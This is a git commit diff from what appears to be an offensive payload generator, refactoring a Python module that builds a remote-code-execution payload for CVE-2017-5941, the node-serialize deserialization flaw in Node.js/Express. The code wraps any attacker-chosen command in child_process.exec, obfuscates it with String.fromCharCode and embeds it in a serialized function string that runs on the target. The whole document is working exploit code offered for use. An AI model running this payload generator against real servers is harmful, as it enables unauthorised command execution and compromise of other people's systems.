ffcfd451b9b6a26ca97511338819e27396d5f88e
S4m Freeside <snovvcrash@protonmail.ch>
2018-09-12 09:22:56 -0400

    Minor edits

--- payloads/NodejsExpress.py
+++ payloads/NodejsExpress.py
@@ -6,21 +6,22 @@ Based on:  https://github.com/hoainam1989/training-application-security/blob/mas
 Target URL example:  http://<RHOST>:<RPORT>
 """
 
-EXEC_FUNCTION = '''\
-require('child_process').exec('%s', function(error, stdout, stderr) {
-    console.log(error)
-    console.log(stdout)
-})\
-'''
-
 
 def genPayload(cmd):
 	"""CVE-2017-5941."""
-	payload = EXEC_FUNCTION % cmd
+	payload = _buildExecCommand(cmd)
 	payload = _encodeString(payload)
 	payload = '{"run":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % payload
 
 	return payload
+
+
+def _buildExecCommand(cmd):
+	return '''\
+        require('child_process').exec('%s', function(error, stdout, stderr) {
+            console.log(error)
+            console.log(stdout)
+        })''' % cmd
 
 
 def _encodeString(string):
